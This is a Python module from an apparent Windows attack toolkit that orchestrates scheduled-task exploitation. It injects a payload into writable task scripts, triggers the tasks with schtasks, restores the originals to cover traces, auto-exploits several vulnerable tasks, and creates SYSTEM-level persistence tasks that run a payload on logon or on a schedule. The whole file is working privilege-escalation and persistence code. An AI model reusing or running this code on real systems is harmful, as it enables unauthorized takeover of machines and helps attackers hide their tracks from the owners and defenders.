import os
import time
from typing import Optional, Tuple, List, Dict
from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import TaskExploitBase
from ..core.enumerator import TaskEnumerator
from ..core.analyzer import TaskAnalyzer, ExploitOpportunity
from ..exploits.script_injector import ScriptInjector


class TaskExploiter(TaskExploitBase):
    """Orchestrate scheduled task exploitation."""

    def __init__(self, output_dir: str = "task_exploits", verbose: bool = False):
        """
        Initialize the task exploiter.

        Args:
            output_dir: Directory for storing output files
            verbose: Enable verbose logging
        """
        super().__init__(output_dir, verbose)

        self.enumerator = TaskEnumerator(output_dir, verbose)
        self.analyzer = TaskAnalyzer(output_dir, verbose)
        self.injector = ScriptInjector(output_dir, verbose)

        self.log("Task Exploiter initialized", "SUCCESS")

    def exploit_writable_script(self, task_name: str, script_path: str,
                                payload_path: str,
                                auto_restore: bool = True,
                                trigger: bool = True) -> bool:
        """
        Exploit a scheduled task with a writable script.

        Workflow:
        1. Backup original script
        2. Inject payload while preserving functionality
        3. Trigger task or wait for scheduled run
        4. Optionally restore original script

        Args:
            task_name: Name of the task
            script_path: Path to the writable script
            payload_path: Path to payload executable
            auto_restore: Restore original script after exploitation
            trigger: Attempt to trigger task manually

        Returns:
            True if successful, False otherwise
        """
        self.log(f"Exploiting task: {task_name}")
        self.log(f"Target script: {script_path}")
        self.log(f"Payload: {payload_path}")

        # Step 1: Inject payload
        success, backup_path = self.injector.inject_payload(
            script_path,
            payload_path,
            backup=True
        )

        if not success:
            self.log("Payload injection failed", "ERROR")
            return False

        self.log("Payload injected successfully", "SUCCESS")

        # Step 2: Trigger task or wait
        if trigger:
            triggered = self._attempt_trigger(task_name)

            if triggered:
                self.log("Task triggered - waiting for execution...", "INFO")
                time.sleep(5)
            else:
                next_run = self._get_next_run(task_name)
                self.log(f"Cannot trigger manually. Next run: {next_run}", "INFO")
        else:
            next_run = self._get_next_run(task_name)
            self.log(f"Waiting for scheduled run: {next_run}", "INFO")

        # Step 3: Restore original if requested
        if auto_restore and backup_path:
            self.log("Restoring original script...", "INFO")

            if trigger:
                # Wait a bit more before restoring
                time.sleep(3)

            restored = self.injector.restore_script(script_path, backup_path)

            if restored:
                self.log("Original script restored", "SUCCESS")
            else:
                self.log("Failed to restore - manual cleanup required!", "ERROR")
                self.log(f"Backup location: {backup_path}", "INFO")

        return True

    def _attempt_trigger(self, task_name: str) -> bool:
        """
        Attempt to manually trigger a scheduled task.

        Args:
            task_name: Name of the task

        Returns:
            True if triggered, False otherwise
        """
        self.log(f"Attempting to trigger task: {task_name}")

        result = self.execute_command(f'schtasks /run /tn "{task_name}"')

        if result['success']:
            self.log("Task triggered successfully", "SUCCESS")
            return True

        if 'access is denied' in result.get('stderr', '').lower():
            self.log("Access denied - cannot trigger manually", "WARNING")
        else:
            self.log(f"Trigger failed: {result.get('stderr', 'Unknown error')}", "WARNING")

        return False

    def _get_next_run(self, task_name: str) -> str:
        """
        Get the next scheduled run time.

        Args:
            task_name: Name of the task

        Returns:
            Next run time string
        """
        result = self.execute_command(f'schtasks /query /tn "{task_name}" /fo LIST /v')

        if not result['success']:
            return "Unknown"

        for line in result['stdout'].split('\n'):
            if 'Next Run Time' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    return parts[1].strip()

        return "Unknown"

    def auto_exploit(self, payload_path: str,
                     max_exploits: int = 5,
                     auto_restore: bool = True) -> int:
        """
        Automatically enumerate and exploit vulnerable tasks.

        Args:
            payload_path: Path to payload executable
            max_exploits: Maximum number of tasks to exploit
            auto_restore: Restore original scripts after exploitation

        Returns:
            Number of successfully exploited tasks
        """
        self.log("Starting automated task exploitation", "INFO")
        print("=" * 60)

        # Verify payload
        if not os.path.exists(payload_path):
            self.log(f"Payload not found: {payload_path}", "ERROR")
            return 0

        # Step 1: Analyze tasks
        self.log("\n[Phase 1] Analyzing scheduled tasks...", "INFO")
        opportunities = self.analyzer.analyze_all_tasks()

        if not opportunities:
            self.log("No exploitation opportunities found", "WARNING")
            return 0

        # Filter for high-priority writable scripts
        high_priority = [
            opp for opp in opportunities
            if opp.severity == 'high' and opp.opportunity_type == 'writable_script'
        ]

        if not high_priority:
            self.log("No high-priority writable scripts found", "WARNING")
            self.analyzer.display_findings()
            return 0

        self.log(f"Found {len(high_priority)} exploitable tasks", "SUCCESS")

        # Step 2: Exploit tasks
        self.log("\n[Phase 2] Exploiting vulnerable tasks...", "INFO")

        success_count = 0

        for opp in high_priority[:max_exploits]:
            self.log(f"\nExploiting: {opp.task_name}", "INFO")

            success = self.exploit_writable_script(
                task_name=opp.task_name,
                script_path=opp.target_path,
                payload_path=payload_path,
                auto_restore=auto_restore,
                trigger=True
            )

            if success:
                success_count += 1
                self.log(f"Successfully exploited: {opp.task_name}", "SUCCESS")

        # Step 3: Report
        self.log("\n[Phase 3] Generating report...", "INFO")
        self.analyzer.export_analysis()

        self.log(f"\nAutomated exploitation complete", "SUCCESS")
        self.log(f"Successfully exploited: {success_count}/{len(high_priority[:max_exploits])} tasks", "INFO")

        return success_count

    def enumerate_only(self) -> List[ExploitOpportunity]:
        """
        Enumerate and analyze tasks without exploitation.

        Returns:
            List of exploitation opportunities
        """
        self.log("Enumeration mode - no exploitation", "INFO")

        opportunities = self.analyzer.analyze_all_tasks()
        self.analyzer.display_findings()

        return opportunities

    def create_persistence(self, task_name: str, payload_path: str,
                           schedule: str = "DAILY",
                           start_time: str = "09:00") -> bool:
        """
        Create a new scheduled task for persistence.

        Args:
            task_name: Name for the new task
            payload_path: Path to payload
            schedule: Schedule type (DAILY, WEEKLY, ONLOGON, etc.)
            start_time: Start time for scheduled tasks

        Returns:
            True if successful, False otherwise
        """
        self.log(f"Creating persistence task: {task_name}", "INFO")

        # Build schtasks command
        if schedule == "ONLOGON":
            cmd = (
                f'schtasks /create /tn "{task_name}" '
                f'/tr "{payload_path}" '
                f'/sc ONLOGON /ru SYSTEM'
            )
        else:
            cmd = (
                f'schtasks /create /tn "{task_name}" '
                f'/tr "{payload_path}" '
                f'/sc {schedule} /st {start_time} /ru SYSTEM'
            )

        result = self.execute_command(cmd)

        if result['success']:
            self.log(f"Persistence task created: {task_name}", "SUCCESS")
            return True
        else:
            self.log(f"Failed to create task: {result.get('stderr', 'Unknown error')}", "ERROR")
            return False

    def delete_task(self, task_name: str) -> bool:
        """
        Delete a scheduled task (cleanup).

        Args:
            task_name: Name of task to delete

        Returns:
            True if successful, False otherwise
        """
        self.log(f"Deleting task: {task_name}", "INFO")

        result = self.execute_command(f'schtasks /delete /tn "{task_name}" /f')

        if result['success']:
            self.log("Task deleted successfully", "SUCCESS")
            return True
        else:
            self.log(f"Failed to delete task: {result.get('stderr', '')}", "ERROR")
            return False


if __name__ == "__main__":
    exploiter = TaskExploiter(verbose=True)

    print("\n" + "=" * 60)
    print("Scheduled Task Exploiter - Enumeration Mode")
    print("=" * 60 + "\n")

    exploiter.enumerate_only()